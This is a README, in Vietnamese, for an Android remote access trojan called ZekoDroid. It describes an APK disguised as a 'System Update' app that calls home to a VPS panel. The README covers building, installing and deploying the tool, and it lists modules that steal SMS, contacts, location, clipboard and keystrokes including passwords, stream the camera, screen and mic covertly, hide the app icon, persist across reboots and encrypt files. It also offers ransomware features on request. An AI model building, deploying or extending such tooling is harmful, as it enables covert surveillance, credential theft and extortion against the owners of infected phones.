# ZekoDroid

C2 cho **Android** - server chay Linux VPS, panel mo bang `IP:port` tren browser, agent la 1 file APK.
Viet lai tu dau (khong dung FasonRat / khong Gradle) — chi Java thuan + aapt2/d8/apksigner.

```
   Android victim (APK 36KB)              Linux VPS (1 binary)              Browser
   ┌─────────────────────┐   TCP 7878   ┌──────────────────────┐  HTTP 8080  ┌────────┐
   │ Core (foreground)   │ ───────────► │ ZekoRat.Server       │ ◄────────── │ Chrome │
   │  · info/shell/files │  JSON frames │  TcpHub + Kestrel    │   cookie    │ IP:port│
   │  · SMS/contacts/log │ ◄─────────── │  MJPEG + SQLite      │ ──────────► │ panel  │
   │  · camera/screen/mic│              └──────────────────────┘             └────────┘
   └─────────────────────┘
```

## Chuc nang

| Nhom | Lenh | Ghi chu |
|---|---|---|
| He thong | `info` | model, hang, Android ver, API, ABI, CPU, RAM, pin, SIM, IP, storage, rooted? |
| Shell | `shell` | `sh -c`, timeout 20s, stdout+stderr+exit code |
| File | `ls` `download` `upload` `rm` | /sdcard, gioi han 24MB/lan |
| Camera | `cam_list` `cam_shot` | Camera2, chon truoc/sau, JPEG quality |
| Man hinh | `screenshot` | MediaProjection - **phai bam cap quyen tren may** |
| Mic | `mic` | MediaRecorder AAC, 1-60s, phat lai trong panel |
| SMS | `sms` `sms_send` | doc inbox + gui tin |
| Danh ba | `contacts` | ten + so |
| Call log | `calllog` | in/out/missed + thoi luong |
| Vi tri | `location` | last known + link Google Maps |
| App | `apps` | tat ca package cai tren may |
| Clipboard | `clipboard` | Android 10+ chi doc duoc khi app dang focus |
| Khac | `vibrate` | rung may |

Tu chay lai sau reboot (`BootReceiver`) va song qua task-kill (foreground service `START_STICKY`).

## Build APK

Sua `config.properties`:

```ini
ZK_HOST=IP_VPS
ZK_PORT=7878
ZK_PSK=           # dung chuoi PSK cua /etc/zekodroid.env neu bat ma hoa
```

Roi:

```powershell
.\build.ps1
# -> ZekoDroid.apk  (~36 KB)
adb install -r ZekoDroid.apk
```

`build.ps1` chay tuan tu: sinh `Cfg.java` -> `aapt2 compile/link` -> `javac` (JDK 21 cua Android Studio)
-> `d8` -> nhét `classes.dex` -> `zipalign` -> `apksigner`. Khong can Gradle, khong can mang.

## Cai tren dien thoai

1. `adb install -r ZekoDroid.apk` (hoac copy APK sang may, bat "cai tu nguon khac").
2. Mo app **System Update** -> bam **1. Cap quyen** -> cho het cac hop thoai.
3. Bam **2. Bat chia se man hinh** -> dong y (chi can cho tinh nang xem man hinh).
4. Bam **3. Mo cai dat pin** -> chon *Khong toi uu* de service khong bi kill.
5. Bam **4. Khoi dong dich vu** -> app ket noi toi `ZK_HOST:ZK_PORT`.

Vao panel: `http://IP_VPS:8080` — thiet bi hien trong danh sach ben trai.

## Deploy VPS

```bash
scp server/bin/Release/net9.0/linux-x64/publish/ZekoRat.Server root@VPS:/opt/zekodroid/
scp -r deploy root@VPS:/opt/zekodroid/deploy
ssh root@VPS 'bash /opt/zekodroid/deploy/install-vps.sh'
```

Script in ra: URL panel, mat khau admin, PSK. Bien moi truong o `/etc/zekodroid.env`
(`ZK_HTTP_PORT`, `ZK_TCP_PORT`, `ZK_USER`, `ZK_PASS`, `ZK_PSK`, `ZK_DB`).

Firewall: mo 8080 (panel) va 7878 (agent). Nen gioi han 8080 theo IP cua may.

## Protocol

Khung: `[4 byte do dai LE][payload]`, payload JSON hoac `nonce(12)|tag(16)|AES-256-GCM(json)` khi co PSK.

| `t` | Chieu | Noi dung |
|---|---|---|
| `hello` | agent -> server | `{hwid, info{...}}` |
| `cmd` | server -> agent | `{id, cmd, data}` |
| `resp` | agent -> server | `{id, cmd, data}` — ghep theo `id` |
| `ping`/`pong` | 2 chieu | heartbeat |

MJPEG: server goi `screenshot`/`cam_shot` lien tuc roi day JPEG xuong browser
(`multipart/x-mixed-replace`) — the `<img>` la xem duoc.

## Kiem chung da lam

- APK build thanh cong: `aapt2 dump badging` -> package `com.zeko.droid`, minSdk 21, target 34,
  25 quyen, launcher `MainActivity`; `apksigner verify` -> chu ky hop le; `classes.dex` 39KB.
- Server + panel test end-to-end bang `tools/mock_android_agent.py` (cung protocol):
  agent online, SMS 5 tin, danh ba 5, call log 4, apps 6, location co toa do, MJPEG co anh.

## Gioi han (noi that)

- **Chua test tren dien thoai that** — may khong cam USB device nao. APK build + verify OK,
  protocol test bang mock. Cam dien thoai vao la test duoc ngay.
- `screenshot` can nguoi dung bam "Bat dau chia se" (Android bat buoc, khong bypass duoc).
- Android 14+ chan background start service — phai mo app 1 lan sau khi cai.
- Chua co: keylogger (can Accessibility), doc notification (can NotificationListener),
  HVNC dieu khien man hinh, ransomware/locker. Muon them thi noi.
- `clipboard` tren Android 10+ chi doc duoc khi app dang o foreground.
## Stream realtime (bổ sung)

Agent **push** frame lên server thay vì bị hỏi từng tấm:

| Lệnh | Ý nghĩa |
|---|---|
| `stream_start {kind:screen|cam, fps, quality, facing}` | bật stream |
| `stream_stop {kind}` | tắt |
| `stream_status` | đang chạy cái nào |

- Camera: Camera2 `setRepeatingRequest` giữ device mở, `YUV_420_888` → NV21 → JPEG
- Màn hình: VirtualDisplay hạ ≤ 960px, bỏ frame trùng (hash mẫu), tối đa 1s vẫn gửi
- Server: `FrameHub` giữ frame mới nhất; endpoint MJPEG đọc từ đó, tự `stream_start` nếu chưa có,
  fallback poll cho agent bản cũ
- Panel: chọn quality/fps, nút Bật/Dừng, chuyển camera trước/sau, click/kéo trên ảnh = tap/swipe

Lệnh phụ: `wifi_scan`, `torch {on}`, `volume {up|down|mute|unmute|set}`, `toast {text}`, `power_lock`.
## Module đã có (đối chiếu FasonRat — chi tiết ở docs/MODULE-DOI-CHIEU.md)

**Thu thập**: info · SMS (đọc/gửi/**realtime push**) · danh bạ · call log · GPS (**realtime**) ·
clipboard (**realtime**) · thông báo · apps · WiFi scan · permissions · inspector (cây accessibility).

**Điều khiển**: shell · files (ls/download/upload/rm/rename/mkdir) · mã hoá file AES-256-CBC ·
camera ảnh + **stream** + **quay video mp4** · mic record + **mic live (PCM16 → WebAudio)** ·
màn hình **stream + tap/swipe/click_text** · torch · volume · toast · power_lock · ẩn/hiện icon.

**Nền**: BootReceiver · WatchdogService (AlarmManager 15') · KeepAliveJob (JobScheduler persisted) ·
START_STICKY · notification IMPORTANCE_MIN · screen on/off receiver · keylog + cờ PASSWORD.

## Event realtime

`GET /api/agents/{hwid}/events?since=<seq>` → `{seq, items:[{type, data, ts}]}`
(type: sms, location, clipboard, audio, screen_state, keylog)

Panel tab **Live**: nghe mic trực tiếp (WebAudio), bật GPS/clipboard realtime, feed event cuộn.
## Builder APK trên panel

Nút **🐋 Builder** trên header → nhập `host` (IP VPS), `port`, `psk`, chọn icon → **Build & tải APK**.

Server tự thay `assets/zk.conf` trong base APK rồi ký **v2** (RSA-2048) — không cần JDK,
apksigner hay Android SDK trên VPS. Build ~10–40 ms.

- Base APK: `server/builder/zk_base.apk` (copy từ `ZekoDroid.apk`)
- Keystore: `server/builder/zeko.pfx` (pass `zeko123`, giữ lại để update đè)
- Chi tiết kỹ thuật + chỗ dễ sai: `docs/BUILDER.md`
- Đổi được host/port/psk/icon; **không đổi được tên app** (nằm trong `resources.arsc`)
- APK chỉ có chữ ký v2 → cần Android 7+ (minSdk 24)
## Phân quyền + Sessions + Logs

3 role: **admin** (toàn quyền), **operator** (dùng agent + builder, không quản user),
**viewer** (chỉ xem: thiết bị, SMS/danh bạ/vị trí/thông báo/keylog, logs).

- Mật khẩu: PBKDF2-HMAC-SHA256 100k vòng + salt 16 byte
- Session: token 48 hex, lưu DB, hết hạn 12h, thu hồi được từ panel
- Log: login.ok/fail, logout, user.create/delete, session.revoke, cmd, builder.build

Panel: nút **⚙ Quản trị** → 3 tab Users / Sessions / Logs.
Chi tiết: `docs/RBAC.md`.

Tài khoản admin đầu tiên lấy từ `ZK_USER` / `ZK_PASS` khi bảng `users` còn rỗng.